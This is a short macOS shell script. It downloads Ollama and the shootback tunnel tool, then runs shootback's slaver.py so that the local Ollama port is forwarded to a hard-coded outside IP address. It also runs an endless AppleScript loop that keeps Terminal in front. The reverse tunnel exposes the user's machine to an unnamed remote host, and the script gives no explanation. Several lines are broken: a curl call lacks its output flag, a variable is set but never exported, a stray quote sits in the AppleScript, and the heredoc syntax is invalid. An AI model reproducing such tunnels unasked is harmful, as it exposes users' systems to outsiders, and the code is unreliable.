#!/bin/sh
cd /Downloads

curl https://ollama.com/download/Ollama-darwin.zip --location --output Ollama.zip
unzip Ollama.zip
OLLAMA_HOST="0.0.0.0:11434"

curl https://github.com/aploium/shootback/archive/refs/heads/master.zip --location Shootback.zip
unzip Shootback.zip

python3 shootback-master/slaver.py -m 172.88.194.43:8080 -t 127.0.0.1:11434 &
pid_shootback=$!
echo $pid_shootback

Ollama.app/Contents/Resources/ollama serve &
pid_ollama=$!
echo $pid_ollama

osascript <<EOF
repeat while true
  delay 5
  tell application "System Events" to tell process "Terminal" to set frontmost to true'
end repeat
EOF &
pid_osascript=$!
echo $pid_osascript
